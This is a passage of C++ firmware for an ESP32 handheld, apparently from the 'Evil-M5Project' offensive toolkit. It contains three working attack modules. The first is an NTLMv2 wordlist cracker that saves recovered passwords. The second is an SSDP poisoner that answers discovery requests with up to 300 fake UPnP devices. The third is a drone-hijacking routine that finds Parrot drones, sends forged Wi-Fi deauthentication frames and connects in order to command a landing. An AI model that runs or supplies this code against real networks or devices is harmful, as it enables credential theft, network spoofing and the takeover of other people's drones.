    Serial.println("[ERROR] Cannot open /evil/NTLM/ntlm_hashes.txt");
    waitAndReturnToMenu("Back To Main Menu");
    return;
  }

  if (hf.size() == 0) {
    Serial.println("[WARN] /evil/NTLM/ntlm_hashes.txt is empty!");
    hf.close();

    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(20, 50);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
    M5.Display.println("ntlm_hashes.txt is empty!");
    delay(2000);

    waitAndReturnToMenu("Back To Main Menu");
    return;
  }
  bool stopRequested = false;
  while (hf.available() && !stopRequested) {
    if (isBackspacePressed()) {
      stopRequested = true;
      break;
    }
    String line = hf.readStringUntil('\n');
    line.trim();
    if (line.length() < 10 || line.startsWith("-")) continue;

    Serial.println("=====================================");
    Serial.println("[INFO] Testing hash line: " + line);

    // Parse NTLMv2 line: user::domain:challenge:ntproof:blob
    int idx1 = line.indexOf("::");
    int idx2 = line.indexOf(":", idx1+2);
    int idx3 = line.indexOf(":", idx2+1);
    int idx4 = line.indexOf(":", idx3+1);
    if (idx1 < 0 || idx2 < 0 || idx3 < 0 || idx4 < 0) {
      Serial.println("[WARN] Invalid line format, skipping.");
      continue;
    }

    String user     = line.substring(0, idx1);
    String domain   = line.substring(idx1+2, idx2);
    String challHex = line.substring(idx2+1, idx3);
    String ntProofHex = line.substring(idx3+1, idx4);
    String blobHex  = line.substring(idx4+1);

    drawNTLMInitUser(user);

    uint8_t challenge[8];  hexToBytes(challHex, challenge, 8);
    uint8_t ntProof[16];   hexToBytes(ntProofHex, ntProof, 16);

    int blobLen = blobHex.length()/2;
    if (blobLen <= 0) { Serial.println("[WARN] Invalid blob, skipping."); continue; }
    uint8_t *blob = (uint8_t*)malloc(blobLen);
    hexToBytes(blobHex, blob, blobLen);

    // PrÃ©-construire SC||Blob
    size_t msgLen = 8 + (size_t)blobLen;
    uint8_t *msg = (uint8_t*)malloc(msgLen);
    memcpy(msg, challenge, 8);
    memcpy(msg+8, blob, blobLen);

    // PrÃ©-construire UTF16LE(UPPER(user)+domain) â€” garder le '$' sâ€™il existe
    String upUser = toUpperCase(user);
    uint8_t *u16, *d16; size_t u16len, d16len;
    toUTF16LE(upUser, &u16, &u16len);
    toUTF16LE(domain, &d16, &d16len);
    uint8_t *idbuf = (uint8_t*)malloc(u16len + d16len);
    memcpy(idbuf, u16, u16len);
    memcpy(idbuf + u16len, d16, d16len);
    free(u16); free(d16);

    // Ouvrir la wordlist
    File wf = SD.open("/evil/NTLM/ntlm_wordlist.txt", FILE_READ);
    if (!wf) {
      Serial.println("[ERROR] No /evil/NTLM/ntlm_wordlist.txt found");
      free(blob); free(msg); free(idbuf);
      continue;
    }
    const uint32_t totalBytes = wf.size();
    
    bool found = false;
    uint32_t tried = 0;

    uint32_t lastUpdateTried = 0;
    uint32_t lastUpdateTime  = millis();

    String pwd;
    pwd.reserve(64);
    
    while (wf.available() && !found && !stopRequested) {
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        Serial.println("[INFO] Skip requested -> next user");
        break;
      }
      if (isBackspacePressed()) {
        stopRequested = true;
        break;
      }
      String pwd = wf.readStringUntil('\n');
      pwd.trim();
      if (pwd.length() == 0) continue;          // skip lignes vides
      if (pwd[0] == '#' || pwd[0] == ';') continue; // skip commentaires

      uint8_t nthash[16];
      ntlmHash(pwd.c_str(), nthash);

      // v2Key = HMAC_MD5(NT_hash, UTF16LE(UPPER(user)+domain))
      uint8_t v2key[16];
      fastHMAC_MD5(nthash, 16, idbuf, u16len + d16len, v2key);
      
      // resp = HMAC_MD5(v2key, challenge||blob)
      uint8_t resp[16];
      fastHMAC_MD5(v2key, 16, msg, msgLen, resp);


      tried++;
      if ((tried % 1000) == 0) {
        drawNTLMTries(tried);
        uint32_t processedBytes = wf.position();
        drawProgressBar(processedBytes, totalBytes);    
        uint32_t now = millis();
        uint32_t elapsed = now - lastUpdateTime;
        if (elapsed > 0) {
          uint32_t hashes = tried - lastUpdateTried;
          uint32_t hps = (hashes * 1000UL) / elapsed; // H/s
          drawHashrate(hps);
          lastUpdateTried = tried;
          lastUpdateTime  = now;
        }
      }


      if (memcmp(resp, ntProof, 16) == 0) {
        String foundMsg = "[SUCCESS] \nFOUND password for :\n" + user + ":" + pwd;
        Serial.println(foundMsg);

        // --- FEEDBACK : rÃ©sultat trouvÃ© ---
        drawNTLMResult(foundMsg, true);

        // Sauvegarde dans le fichier
        File foundFile = SD.open("/evil/NTLM/ntlm_found.txt", FILE_APPEND);
        if (foundFile) {
          foundFile.print(user);
          foundFile.print("::");
          foundFile.print(domain);
          foundFile.print(": ");
          foundFile.println(pwd);
          foundFile.close();
        } else {
          Serial.println("[ERROR] Failed to open /evil/NTLM/ntlm_found.txt for writing.");
        }
        delay(2000);
        found = true;
        break;
      }
    }
    if (wf.position() == totalBytes) {
      drawProgressBar(totalBytes, totalBytes);
    }
    wf.close();

    if (!found) {
      Serial.print("[RESULT] No match in wordlist for user ");
      Serial.println(user);

      // --- FEEDBACK : rÃ©sultat FAIL ---
      drawNTLMResult("[FAIL] \n No match for :\n " + user, false);
    }

    free(idbuf);
    free(msg);
    free(blob);

    delay(1000);
  }
  hf.close();
  waitAndReturnToMenu("Back To Main Menu");
}





bool cleanDuplicatesUserDomain(const char *filePath) {
  File f = SD.open(filePath, FILE_READ);
  if (!f) return false;

  std::set<String> seenUsers;    // stocke les couples "user::domain"
  std::vector<String> cleaned;   // stocke les lignes retenues

  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() < 10 || line.startsWith("-")) continue;

    int idx1 = line.indexOf("::");
    int idx2 = line.indexOf(":", idx1 + 2);
    if (idx1 < 0 || idx2 < 0) continue;

    String user   = line.substring(0, idx1);
    String domain = line.substring(idx1 + 2, idx2);
    String key = user + "::" + domain;

    if (seenUsers.find(key) == seenUsers.end()) {
      seenUsers.insert(key);
      cleaned.push_back(line);
    }
  }
  f.close();

  File nf = SD.open(filePath, FILE_WRITE);
  if (!nf) return false;
  for (auto &entry : cleaned) {
    nf.println(entry);
  }
  nf.close();

  return true;
}


void CleanNTLMHashes() {
  // Demander confirmation avec ton popup existant
  if (!confirmPopup("Clean duplicates ?")) {
    Serial.println("[INFO] User cancelled duplicate cleanup.");
    waitAndReturnToMenu("Aborted.");
    return;
  }

  Serial.println("[INFO] Starting cleanup of /evil/NTLM/ntlm_hashes.txt ...");

  if (!SD.exists("/evil/NTLM/ntlm_hashes.txt")) {
    Serial.println("[WARN] File not found: /evil/NTLM/ntlm_hashes.txt");
    return;
  }
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(5, 60);
    M5.Display.setTextSize(2.5);
    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
    M5.Display.println("Please wait !");
    M5.Display.println("Cleaning up..");
  if (cleanDuplicatesUserDomain("/evil/NTLM/ntlm_hashes.txt")) {
    Serial.println("[INFO] Duplicate cleanup completed successfully.");
    // Affichage Ã©cran feedback
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(5, 60);
    M5.Display.setTextSize(2.5);
    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
    M5.Display.println("Cleanup done!");
    delay(1500);
  } else {
    Serial.println("[ERROR] Duplicate cleanup failed.");
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(5, 60);
    M5.Display.setTextSize(2.5);
    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
    M5.Display.println("Cleanup failed!");
    delay(1500);
  }
  waitAndReturnToMenu("Back To Main Menu");

}
























#include <time.h>

// === RÃ©seau SSDP ===
WiFiUDP udpSSDP;
WebServer ssdpServer(80);
bool isFakeSSDPActive = false;

int ssdpSearchCount = 0;
long ssdpSentCount = 0;
String lastSSDPClient = "";
String lastSSDPService = "";
int ssdpDeviceCount = 50;  // choisi par lâ€™utilisateur au runtime

// Types connus
const char* kTypes[] = {
  // === MÃ©dias (50) ===
  "urn:schemas-upnp-org:device:MediaServer:1",
  "urn:schemas-upnp-org:device:MediaRenderer:1",

  // === Imprimantes / scanners (50) ===
  "urn:schemas-upnp-org:device:Printer:1",
  "urn:schemas-upnp-org:device:Scanner:1",

  // === RÃ©seau (50) ===
  "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
  "urn:schemas-upnp-org:device:LANDevice:1",

  // === Domotique (50) ===
  "urn:schemas-upnp-org:device:DimmableLight:1",

  // === Autres pÃ©riphÃ©riques (50) ===
  "urn:schemas-upnp-org:device:Camera:1",

};

int kTypeCount = sizeof(kTypes)/sizeof(kTypes[0]);

#define MAX_SSDP_DEVICES 300
#define SSDP_MAX_UDP     512
#define NAME_MAX_LEN     32

// === Tables globales ===
static std::vector<std::array<char, NAME_MAX_LEN+1>> gNames;
int  gNameCount = 0;

struct Dev {
  char uuid[37];
  const char* type;
};
static std::vector<Dev> gDevs;

// === Utils ===
bool clockIsValid() {
  time_t now = time(nullptr);
  return now > 1609459200UL;
}

void makeUuidV4(char out[37]) {
  uint8_t b[16];
  for (int i=0;i<16;i++) b[i] = (uint8_t)(esp_random() & 0xFF);
  b[6] = (b[6] & 0x0F) | 0x40;
  b[8] = (b[8] & 0x3F) | 0x80;
  sprintf(out,
    "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
    b[0],b[1],b[2],b[3], b[4],b[5], b[6],b[7],
    b[8],b[9], b[10],b[11],b[12],b[13],b[14],b[15]);
}

void trimInPlace(char* s) {
  int n = strlen(s);
  while (n>0 && (s[n-1]=='\r' || s[n-1]=='\n' || s[n-1]==' ' || s[n-1]=='\t')) s[--n]=0;
  int i=0; while (s[i]==' ' || s[i]=='\t') i++;
  if (i>0) memmove(s, s+i, strlen(s+i)+1);
}

void loadDeviceNames() {
  gNameCount = 0;
  gNames.clear();
  gNames.reserve(MAX_SSDP_DEVICES);
  File f = SD.open("/evil/config/SSDPName.txt");
  if (!f) {
    Serial.println("[-] SSDPName.txt introuvable -> fallback Evil-###");
    return;
  }
  char line[128]; int pos=0;
  while (f.available() && gNameCount < ssdpDeviceCount) {
    int c = f.read();
    if (c < 0) break;
    if (c == '\r') continue;
    if (c == '\n') {
      line[pos] = 0; trimInPlace(line);
      if (line[0]) {
        if ((int)gNames.size() <= gNameCount) gNames.emplace_back();
        strncpy(gNames[gNameCount].data(), line, NAME_MAX_LEN);
        gNames[gNameCount].data()[NAME_MAX_LEN] = 0;
        gNameCount++;
      }
      pos = 0;
    } else {
      if (pos < (int)sizeof(line)-1) line[pos++] = (char)c;
    }
  }
  if (pos>0 && gNameCount < ssdpDeviceCount) {
    line[pos]=0; trimInPlace(line);
    if (line[0]) {
      if ((int)gNames.size() <= gNameCount) gNames.emplace_back();
      strncpy(gNames[gNameCount].data(), line, NAME_MAX_LEN);
      gNames[gNameCount].data()[NAME_MAX_LEN] = 0;
      gNameCount++;
    }
  }
  f.close();
  Serial.printf("[*] Noms chargÃ©s: %d\n", gNameCount);
}

void getFriendlyName(int idx, char* out, size_t outsz) {
  if (gNameCount == 0) {
    // Aucun nom chargÃ©, fallback Evil-###
    snprintf(out, outsz, "Evil-%03d", idx);
  } else if (idx < gNameCount) {
    // Utiliser le nom exact de la liste
    strncpy(out, gNames[idx].data(), outsz - 1);
    out[outsz - 1] = 0;
  } else {
    // Plus dâ€™entrÃ©es que de noms â†’ recycler avec modulo
    int base = idx % gNameCount;
    snprintf(out, outsz, "%s-%d", gNames[base].data(), idx);
  }
}


// === SCPD minimal ===
void registerScpdRoutesOnce() {
  ssdpServer.on("/cmr.xml", HTTP_GET, []() {
    const char* xml =
      "<?xml version=\"1.0\"?>"
      "<scpd xmlns=\"urn:schemas-upnp-org:service-1-0\">"
        "<specVersion><major>1</major><minor>0</minor></specVersion>"
        "<actionList/>"
        "<serviceStateTable/>"
      "</scpd>";
    ssdpServer.send(200, "text/xml; charset=\"utf-8\"", xml);
  });
  ssdpServer.on("/cmr_control", HTTP_ANY, [](){ ssdpServer.send(200, "text/plain", "OK"); });
  ssdpServer.on("/cmr_event",   HTTP_ANY, [](){ ssdpServer.send(200, "text/plain", "OK"); });

  ssdpServer.onNotFound([](){
    String uri = ssdpServer.uri();
    int idx = -1;
    if (uri.startsWith("/desc") && uri.endsWith(".xml")) {
      if (sscanf(uri.c_str(), "/desc%d.xml", &idx) == 1 && idx >= 0 && idx < ssdpDeviceCount) {
        IPAddress locIP = (WiFi.localIP().toString() != "0.0.0.0") ? WiFi.localIP() : WiFi.softAPIP();
        char friendly[NAME_MAX_LEN+16]; getFriendlyName(idx, friendly, sizeof(friendly));

        char xml[768];
        snprintf(xml, sizeof(xml),
          "<?xml version=\"1.0\"?>"
          "<root xmlns=\"urn:schemas-upnp-org:device-1-0\">"
            "<specVersion><major>1</major><minor>0</minor></specVersion>"
            "<device>"
              "<deviceType>%s</deviceType>"
              "<friendlyName>%s</friendlyName>"
              "<manufacturer>Evil-M5Project</manufacturer>"
              "<modelName>%s</modelName>"
              "<UDN>uuid:%s</UDN>"
              "<serviceList>"
                "<service>"
                  "<serviceType>urn:schemas-upnp-org:service:ConnectionManager:1</serviceType>"
                  "<serviceId>urn:upnp-org:serviceId:ConnectionManager</serviceId>"
                  "<SCPDURL>/cmr.xml</SCPDURL>"
                  "<controlURL>/cmr_control</controlURL>"
                  "<eventSubURL>/cmr_event</eventSubURL>"
                "</service>"
              "</serviceList>"
              "<presentationURL>http://%s:80/</presentationURL>"
            "</device>"
          "</root>",
          gDevs[idx].type, friendly, friendly, gDevs[idx].uuid, locIP.toString().c_str()
        );
        ssdpServer.send(200, "text/xml; charset=\"utf-8\"", xml);
        return;
      }
    }
    ssdpServer.send(404, "text/plain", "Not found");
  });
}


SearchKind classifyST(const String& st, String &normalized) {
  String s = st; 
  s.trim();
  if (s.endsWith("\r")) s.remove(s.length()-1);
  String sl = s;
  sl.toLowerCase();

  if (sl == "ssdp:all") {
    normalized = "ssdp:all"; 
    return SK_All;
  }
  if (sl == "upnp:rootdevice") {
    normalized = "upnp:rootdevice"; 
    return SK_Root;
  }
  if (sl.startsWith("uuid:")) {
    normalized = s; 
    return SK_UUID;
  }
  if (sl.startsWith("urn:schemas-upnp-org:device:")) {
    normalized = s; 
    return SK_DevType;
  }

  normalized = s;
  return SK_Other;
}
bool gTypeEnabled[sizeof(kTypes)/sizeof(kTypes[0])];
bool selectAll = true;

// === Nettoyage affichage nom court ===
String shortType(const char* full) {
  String s = full;
  int pos = s.lastIndexOf(":device:");
  if (pos >= 0) s = s.substring(pos + 8); // garde juste aprÃ¨s "device:"
  int colon = s.lastIndexOf(":");
  if (colon >= 0) s = s.substring(0, colon); // enlÃ¨ve :1 ou :2
  return s;
}

// === Menu de sÃ©lection des types ===
void selectTypesUI() {
  for (int i = 0; i < kTypeCount; i++) gTypeEnabled[i] = true;
  selectAll = true;
  int cursor = 0;

  // buffer Ã©tat ancien
  int oldCursor = -1;
  bool oldSelectAll = !selectAll;
  bool oldEnabled[kTypeCount]; 
  for (int i=0;i<kTypeCount;i++) oldEnabled[i] = !gTypeEnabled[i];

  while (true) {
    // Redessine uniquement si changement
    bool needRedraw = (cursor != oldCursor) || (selectAll != oldSelectAll);
    for (int i=0;i<kTypeCount;i++) {
      if (gTypeEnabled[i] != oldEnabled[i]) { needRedraw = true; break; }
    }

    if (needRedraw) {
      auto& d = M5Cardputer.Display;
      d.fillScreen(BLACK);
      d.setTextSize(1.5);
      d.setTextColor(TFT_WHITE, BLACK);

      // Ligne Select All
      d.setCursor(0, 0);
      if (cursor == 0) d.print(">"); else d.print(" ");
      d.printf("%s Select All\n", selectAll ? "[X]" : "[ ]");

      // Liste des types
      for (int i = 0; i < kTypeCount; i++) {
        d.setCursor(0, (i+1)*13);
        if (cursor == i+1) d.print(">"); else d.print(" ");
        d.printf("%s %s", gTypeEnabled[i] ? "[X]" : "[ ]", shortType(kTypes[i]).c_str());
      }

      // maj Ã©tat ancien
      oldCursor = cursor;
      oldSelectAll = selectAll;
      for (int i=0;i<kTypeCount;i++) oldEnabled[i] = gTypeEnabled[i];
    }

    // Gestion clavier
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed('.')) { cursor++; if (cursor > kTypeCount) cursor = 0; delay(150);}
    if (M5Cardputer.Keyboard.isKeyPressed(';')) { cursor--; if (cursor < 0) cursor = kTypeCount; delay(150);}
    if (M5Cardputer.Keyboard.isKeyPressed('x')) {
      if (cursor == 0) {
        selectAll = !selectAll;
        for (int i = 0; i < kTypeCount; i++) gTypeEnabled[i] = selectAll;
      } else {
        gTypeEnabled[cursor-1] = !gTypeEnabled[cursor-1];
      }
      delay(200); // debounce
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      break; // validÃ©
    }
  }
}




void prepareDevices() {
  int idx = 0;
  if ((int)gDevs.size() < ssdpDeviceCount) gDevs.resize(ssdpDeviceCount);
  for (int i = 0; i < ssdpDeviceCount; i++) {
    // trouver le prochain type activÃ©
    while (!gTypeEnabled[idx % kTypeCount]) idx++;
    makeUuidV4(gDevs[i].uuid);
    gDevs[i].type = kTypes[idx % kTypeCount];
    idx++;
  }
}

// === UI sur Cardputer ===
void updateFakeSSDPUI() {
  auto& d = M5Cardputer.Display;
  d.fillScreen(BLACK);

  d.setTextSize(2);
  d.setTextColor(TFT_GREEN, BLACK);
  d.setCursor(5, 5);
  d.print("Poisoning SSDP");

  d.setTextSize(1);
  d.setTextColor(WHITE, BLACK);
  d.setCursor(5, 30);
  d.print("M-SEARCH recv: ");
  d.setTextSize(2);
  d.print(ssdpSearchCount);

  d.setTextSize(1);
  d.setCursor(0, 50);
  d.print(lastSSDPService);

  d.setTextSize(1);
  d.setCursor(5, 70);
  d.print("SSDP sent: ");
  d.setTextSize(2);
  d.print(ssdpSentCount);

  d.setTextSize(1);
  d.setCursor(5, 100);
  d.print("Client: ");
  d.setTextSize(2);
  d.print(lastSSDPClient);

  d.setTextSize(1);
  d.setTextColor(TFT_DARKGREY, BLACK);
  d.setCursor(5, d.height()-12);
  d.print("Press BACKSPACE to exit");
}

#include "lwip/igmp.h"
void fakeSSDP() {
  inMenu = false;

  // 1) Nombre de devices
  M5Cardputer.Display.fillScreen(BLACK);
  M5Cardputer.Display.setTextSize(1.5);
  M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 0);
  M5Cardputer.Display.print("How many devices? (1-300)");
  String input = getUserInput();
  int val = input.toInt();
  if (val < 1) val = 1;
  if (val > MAX_SSDP_DEVICES) val = MAX_SSDP_DEVICES;
  ssdpDeviceCount = val;
  Serial.printf("[*] User selected %d devices\n", ssdpDeviceCount);

  // 2) Noms depuis SD ou custom
  bool useSD = confirmPopup("Use SSDPName.txt from SD?");
  if (useSD) {
    loadDeviceNames();
  } else {
    M5Cardputer.Display.fillScreen(BLACK);
    M5Cardputer.Display.setTextSize(1.5);
    M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5Cardputer.Display.setCursor(0, 0);
    M5Cardputer.Display.print("Custom name?");
    String customName = getUserInput();
    gNames.clear(); gNames.emplace_back();
    strncpy(gNames[0].data(), customName.c_str(), NAME_MAX_LEN);
    gNames[0].data()[NAME_MAX_LEN] = 0;
    gNameCount = 1;
    Serial.printf("[*] Using custom name: %s\n", gNames[0].data());
  }

  selectTypesUI();
  prepareDevices();
  registerScpdRoutesOnce();

  if (!isFakeSSDPActive) {
    // --- Start ---
    server.stop();
    ssdpServer.begin();

    // Multicast plus fiable : dÃ©sactiver power-save
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Sockets locaux (durent tant que la fonction tourne)
    WiFiUDP udpSSDPmc;   // multicast 239.255.255.250:1900
    WiFiUDP udpSSDPuc;   // unicast/broadcast 0.0.0.0:1900 (fallback)

    // STA / AP IP
    IPAddress staIP = WiFi.localIP();
    IPAddress apIP  = WiFi.softAPIP();

    // 1) Multicast
    if (!udpSSDPmc.beginMulticast(IPAddress(239,255,255,250), 1900)) {
      Serial.println("[-] beginMulticast SSDP failed");
      waitAndReturnToMenu("SSDP Error");
      return;
    }

    // 2) Unicast/Broadcast sur 1900 (fallback si AP convertit MCast->UCast)
    if (!udpSSDPuc.begin(1900)) {
      Serial.println("[-] begin UDP/1900 failed");
      waitAndReturnToMenu("SSDP Error");
      return;
    }

    // 3) IGMP join explicite UNIQUEMENT sur STA
    bool joined = false;
    if (staIP.toString() != "0.0.0.0") {
      ip4_addr_t ifaddr, multicast;
      ifaddr.addr    = (uint32_t)staIP;
      multicast.addr = (uint32_t)IPAddress(239,255,255,250);
      err_t err = igmp_joingroup(&ifaddr, &multicast);
      Serial.printf("[*] IGMP join 239.255.255.250 on %s -> err=%d\n",
                    staIP.toString().c_str(), err);
      joined = (err == ERR_OK);
    } else {
      Serial.println("[*] STA not connected -> IGMP join skipped (AP-only).");
    }

    isFakeSSDPActive = true;
    ssdpSearchCount  = 0;
    ssdpSentCount    = 0;
    lastSSDPClient   = "";
    lastSSDPService  = "";
    Serial.println("[+] SSDP Poisoner activated");
    updateFakeSSDPUI();

    // === Boucle principale ===
    auto handleSock = [&](WiFiUDP& sock){
      int packetSize = sock.parsePacket();
      if (packetSize <= 0) return;

      char buffer[SSDP_MAX_UDP];
      int len = sock.read(buffer, sizeof(buffer)-1);
      if (len <= 0) return;
      buffer[len] = 0;

      // DÃ©tection M-SEARCH case-insensitive
      String req(buffer);
      int crlf = req.indexOf("\r\n");
      String firstLine = (crlf > 0) ? req.substring(0, crlf) : req;
      String canon = firstLine; canon.toUpperCase();

      if (canon.indexOf("M-SEARCH") >= 0) {
        ssdpSearchCount++;
        IPAddress cli = sock.remoteIP();
        lastSSDPClient = cli.toString();

        // Extraire ST: tolÃ©rant (ST: / st:)
        String stValue = "ssdp:all";
        int stIndex = req.indexOf("\nST:");
        if (stIndex < 0) stIndex = req.indexOf("\nst:");
        if (stIndex >= 0) {
          int end = req.indexOf("\r\n", stIndex+1);
          String line = req.substring(stIndex+1, (end>stIndex)?end:req.length());
          int colon = line.indexOf(':');
          if (colon >= 0) stValue = line.substring(colon+1);
          stValue.trim();
        }
        lastSSDPService = stValue;

        // Choisir IP locale pour LOCATION (si client est sur notre AP => 192.168.4.x)
        IPAddress locIP = (cli[0]==192 && cli[1]==168 && cli[2]==4) ? apIP : staIP;
        if (locIP.toString() == "0.0.0.0") locIP = WiFi.localIP(); // fallback

        String norm; SearchKind kind = classifyST(stValue, norm);

        for (int i=0;i<ssdpDeviceCount;i++) {
          bool doit = (kind == SK_All) || (kind == SK_Root) ||
                      (kind == SK_DevType && String(gDevs[i].type).equalsIgnoreCase(norm)) ||
                      (kind == SK_UUID && ("uuid:"+String(gDevs[i].uuid)).equalsIgnoreCase(norm));
          if (!doit) continue;

          String loc = "http://" + locIP.toString() + ":80/desc" + String(i) + ".xml";
          String usn = (kind == SK_Root)
                        ? "uuid:" + String(gDevs[i].uuid) + "::upnp:rootdevice"
                        : "uuid:" + String(gDevs[i].uuid) + "::" + String(gDevs[i].type);

          char resp[SSDP_MAX_UDP];
          String head =
            "HTTP/1.1 200 OK\r\n"
            "CACHE-CONTROL: max-age=1800\r\n"
            "EXT:\r\n"
            "LOCATION: " + loc + "\r\n"
            "SERVER: ESP32/3.0 UPnP/1.0 EvilCardputer/1.4.5\r\n"
            "ST: " + (kind==SK_Root ? "upnp:rootdevice" : String(gDevs[i].type)) + "\r\n"
            "USN: " + usn + "\r\n"
            "CONTENT-LENGTH: 0\r\n\r\n";
          size_t n = head.length();
          if (n >= sizeof(resp)) n = sizeof(resp)-1;
          memcpy(resp, head.c_str(), n);

          // RÃ©pondre en unicast sur le port source du client
          sock.beginPacket(cli, sock.remotePort());
          sock.write((const uint8_t*)resp, n);
          sock.endPacket();
          ssdpSentCount++;
          delay(1);
        }
        updateFakeSSDPUI();
      }
    };

    while (isFakeSSDPActive && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      handleSock(udpSSDPmc); // multicast
      handleSock(udpSSDPuc); // unicast/broadcast

      ssdpServer.handleClient();
      handleDnsRequestSerial();
      M5.update();
      M5Cardputer.update();
      delay(2);
    }

    // Sortie propre : leave IGMP (si join fait) + fermer sockets
    if (joined) {
      ip4_addr_t ifaddr, multicast;
      ifaddr.addr    = (uint32_t)staIP;
      multicast.addr = (uint32_t)IPAddress(239,255,255,250);
      err_t errL = igmp_leavegroup(&ifaddr, &multicast);
      Serial.printf("[*] IGMP leave 239.255.255.250 on %s -> err=%d\n",
                    staIP.toString().c_str(), errL);
    }
    udpSSDPmc.stop();
    udpSSDPuc.stop();

    isFakeSSDPActive = false;
    ssdpServer.stop();
    server.begin();
    waitAndReturnToMenu("SSDP Poisoner stopped");
    return;

  } else {
    // --- Stop immÃ©diat si appel en mode dÃ©jÃ  actif (sÃ©curitÃ©) ---
    isFakeSSDPActive = false;
    ssdpServer.stop();
    server.begin();
    waitAndReturnToMenu("SSDP Poisoner stopped");
    return;
  }
}























int atSeq = 1;  // compteur global pour les commandes AT

// Variables statiques pour la position du texte
static int skyjackCursorY = 20;
const int lineHeight = 12;
const int maxY = 135; // hauteur max Ã©cran
const int scrollOffsetSkyjack = lineHeight;

// --- Fonction d'affichage avec scroll automatique ---
void drawSkyjackStatus(const char* msg) {
  if (skyjackCursorY + lineHeight > maxY) {
    // Scroll vers le haut
    M5.Display.scroll(0, -scrollOffsetSkyjack);
    skyjackCursorY -= scrollOffsetSkyjack;
    // Nettoyer la nouvelle ligne du bas
    M5.Display.fillRect(0, skyjackCursorY, 240, lineHeight, TFT_BLACK);
  }

  M5.Display.setCursor(5, skyjackCursorY);
  M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5.Display.setTextSize(1);
  M5.Display.println(">> " + String(msg));
  skyjackCursorY += lineHeight;

  Serial.println("[SkyJack] " + String(msg));
}


// --- GÃ©nÃ©ration de trame Deauth personnalisÃ©e ---
void buildDeauthPacket(uint8_t *packet, const String& bssid) {
  uint8_t bssid_bytes[6];
  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &bssid_bytes[0], &bssid_bytes[1], &bssid_bytes[2],
         &bssid_bytes[3], &bssid_bytes[4], &bssid_bytes[5]);

  uint8_t temp[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // broadcast
    0,0,0,0,0,0, // source (remplacÃ©e)
    0,0,0,0,0,0, // BSSID (remplacÃ©)
    0x00, 0x00
  };
  memcpy(temp+10, bssid_bytes, 6); // Source
  memcpy(temp+16, bssid_bytes, 6); // BSSID
  memcpy(packet, temp, 26);
}

// --- Envoi commande AT avec compteur ---
void sendATCommandToDrone(WiFiClient& client, const String& command) {
  String cmd = "AT*REF=" + String(atSeq++) + "," + command + "\r";
  client.print(cmd);
  Serial.println("[AT] " + cmd);
}

void skyjackDroneMode() {
  M5.Display.clear();
  M5.Display.setCursor(5, 20);
  M5.Display.setTextSize(1.7);
  M5.Display.setTextColor(TFT_GREEN);
  drawSkyjackStatus(">> SKYJACK MODE <<");

  // Ã‰tape 1 : Scan WiFi forcÃ© canal par canal
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);
  drawSkyjackStatus(">> SKYJACK SCAN <<");

  String parrotSSID = "";
  String parrotBSSID = "";
  int parrotChannel = -1;

  for (int ch = 1; ch <= 13; ch++) {
    drawSkyjackStatus(("Scanning CH " + String(ch)).c_str());
    WiFi.scanNetworks(false, true, false, ch);   // scan sur un canal prÃ©cis
    delay(2000); // temps dâ€™Ã©coute suffisant
    int n = WiFi.scanComplete();

    if (n <= 0) continue;

    for (int i = 0; i < n; i++) {
      String bssid = WiFi.BSSIDstr(i);
      String ssid = WiFi.SSID(i);

      if (bssid.startsWith("90:03:B7") || bssid.startsWith("00:26:7E") || bssid.startsWith("A0:14:3D")) {
        parrotSSID   = ssid;
        parrotBSSID  = bssid;
        parrotChannel = ch;
        break;
      }
    }
    if (parrotSSID != "") break; // drone trouvÃ© â†’ sortir
  }

  if (parrotSSID == "") {
    drawSkyjackStatus("No Parrot drones found.");
    waitAndReturnToMenu("No Parrot drones.");
    return;
  }

  drawSkyjackStatus(("Drone: " + parrotSSID).c_str());
  drawSkyjackStatus(("BSSID: " + parrotBSSID).c_str());
  drawSkyjackStatus(("Channel: " + String(parrotChannel)).c_str());

  // Ã‰tape 2 : Envoi Deauth
  drawSkyjackStatus("Sending deauth...");

  esp_wifi_set_promiscuous(false);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_channel(parrotChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);

  uint8_t deauthPacket[26];
  buildDeauthPacket(deauthPacket, parrotBSSID);

  for (int i = 0; i < 30; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delay(10);
  }

  drawSkyjackStatus("Deauth sent.");
  delay(1000);

  // Ã‰tape 3 : Connexion au drone
  drawSkyjackStatus("Connecting...");
  WiFi.mode(WIFI_STA);
  WiFi.begin(parrotSSID.c_str());

  unsigned long startAttemptTime = millis();
  bool connected = false;

  while (millis() - startAttemptTime < 6000) {
    if (WiFi.status() == WL_CONNECTED) {
      connected = true;
      break;
    }
    delay(500);
  }

  if (!connected) {
    drawSkyjackStatus("Connection failed.");
    waitAndReturnToMenu("Fail connect.");
    return;
  }

  drawSkyjackStatus("Connected!");
  drawSkyjackStatus("Sending EMERGENCY + LAND...");

